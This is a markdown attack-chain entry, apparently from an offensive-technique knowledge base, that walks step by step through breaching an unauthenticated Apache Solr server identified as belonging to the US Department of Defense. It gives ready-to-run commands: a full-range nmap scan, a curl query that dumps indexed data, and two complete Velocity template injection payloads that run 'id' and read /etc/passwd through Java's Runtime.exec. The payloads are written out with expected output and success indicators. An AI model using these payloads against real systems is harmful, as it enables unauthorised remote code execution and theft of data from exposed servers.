---
tags:
  - rce
  - solr
  - velocity
  - apache
  - reconnaissance
  - dod
type: attack_chain
tools:
  - '[[tools/Nmap-Port-Scanner]]'
tactics:
  - '[[Reconnaissance]]'
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Reconnaissance-Discover-Target-IP]]'
  - '[[procedures/Port-Scan-Target-Host]]'
  - '[[procedures/Query-Exposed-Solr-Instance]]'
  - '[[procedures/Exploit-Solr-Velocity-RCE-ID-Command]]'
  - '[[procedures/Exploit-Solr-Velocity-RCE-Cat-Passwd]]'
step_count: 5
techniques:
  - '[[Active Scanning]]'
  - '[[Network Service Scanning]]'
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:23:37.359Z'
description: >-
  Multi-stage attack exploiting an unauthenticated Apache Solr instance
  vulnerable to remote code execution through Velocity template injection,
  discovered via reconnaissance on a US Department of Defense system, leading to
  arbitrary command execution as the 'solr' user.
id: 7631ce4c-b15d-4577-b1fb-8170fce5924e
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Active Scanning]]'
  - '[[Network Service Scanning]]'
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# Apache Solr RCE via Velocity Template Injection on Exposed US DoD Instance

Multi-stage attack chain demonstrating reconnaissance, discovery, and exploitation of an unauthenticated Apache Solr instance to achieve remote code execution via Velocity template injection, resulting in arbitrary system command execution on a US Department of Defense server running as the 'solr' user.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance: Discover Target IP] --> B[Port Scan: Identify Solr Service]
    B --> C[Query Solr: Confirm Access to Sensitive Data]
    C --> D[Exploit RCE: Execute 'id' Command]
    D --> E[Exploit RCE: Read /etc/passwd]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Nmap-Port-Scanner]]

### Target Environment

- Linux-based server hosting Apache Solr
- Exposed Solr service on non-standard port (e.g., 8984 or similar)
- No authentication on Solr instance
- Velocity Response Writer enabled

### Initial Access Requirements

- Network access to target IP
- No credentials required due to unauthenticated exposure
- Prior reconnaissance to identify potential government-related hosts

## Detailed Attack Procedures

### Step 1: Reconnaissance Discover Target IP
procedure: [[procedures/Reconnaissance-Discover-Target-IP]]

**Objective**: Identify potential target IP addresses associated with US government systems through reconnaissance.

**Instructions**: During general reconnaissance, stumble upon a target IP (e.g., http://target-ip/) that redirects to a login page indicating US DoD ownership, such as a URL parameter decoding to https://example.mil.

**Expected Output**: Confirmation of target IP with government affiliation via redirect and page content.

**Success Indicators**:
- IP identified with .mil domain reference
- Login page suggesting sensitive environment

### Step 2: Port Scan Identify Solr Service
procedure: [[procedures/Port-Scan-Target-Host]]

**Objective**: Scan the target host to discover open ports and identify the exposed Apache Solr service.

**Instructions**: Use [[commands/nmap-port-scan]] to scan common and non-standard ports on the target IP:

```bash
nmap -p- -T4 target-ip
```

Focus on results showing an open port (e.g., 8984) associated with Solr.

**Expected Output**: List of open ports, including the Solr port with service banner indicating Apache Solr.

**Success Indicators**:
- Non-standard port open for Solr
- No authentication prompts on access

### Step 3: Query Exposed Solr Instance
procedure: [[procedures/Query-Exposed-Solr-Instance]]

**Objective**: Interact with the Solr instance to confirm unauthenticated access and sensitivity of indexed data.

**Instructions**: Send a simple query to the Solr endpoint using [[commands/curl-get-request]]:

```bash
curl "http://target-ip:port/solr/select?q=*:*&wt=json"
```

Examine the response for data from .mil domains.

**Expected Output**: JSON response containing metadata about military units, equipment, and locations from http://example.mil/.

**Success Indicators**:
- Unauthenticated access granted
- Sensitive DoD data returned in query results

### Step 4: Exploit RCE Execute ID Command
procedure: [[procedures/Exploit-Solr-Velocity-RCE-ID-Command]]

**Objective**: Achieve remote code execution by injecting a Velocity template to run the 'id' command and confirm privileges.

**Instructions**: Craft a GET request to the Solr endpoint with a malicious Velocity payload using [[commands/curl-velocity-payload]]:

```bash
curl "http://target-ip:port/solr/core1/select?q=*:*&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
```

This executes the [[commands/id-user-info]] command via Java Runtime.

**Expected Output**: Output showing uid=999(solr) gid=999(solr) groups=999(solr).

**Success Indicators**:
- Command output displayed in response
- User 'solr' privileges confirmed

### Step 5: Exploit RCE Read Passwd File
procedure: [[procedures/Exploit-Solr-Velocity-RCE-Cat-Passwd]]

**Objective**: Demonstrate full RCE by reading sensitive system files like /etc/passwd using another Velocity injection.

**Instructions**: Send a similar GET request but with payload for [[commands/cat-etc-passwd]]:

```bash
curl "http://target-ip:port/solr/core1/select?q=*:*&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/etc/passwd%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
```

**Expected Output**: Contents of /etc/passwd, including root, daemon, and solr user entries.

**Success Indicators**:
- File contents exfiltrated in response
- Evidence of system compromise

## Attack Chain Summary

### Key Achievements

1. Discovered exposed unauthenticated Solr instance on DoD network
2. Confirmed access to sensitive .mil data
3. Achieved RCE executing system commands as 'solr' user
4. Exfiltrated user account information from /etc/passwd

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Active Scanning]] Active Scanning
- [[Network Service Scanning]] Network Service Scanning
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Command-Line Interface]] Command and Scripting Interpreter

### MITRE ATT&CK Tactics

- [[Reconnaissance]] Reconnaissance
- [[Initial Access]] Initial Access
- [[Execution]] Execution

---

*Last updated: 2023-10-01T00:00:00Z*
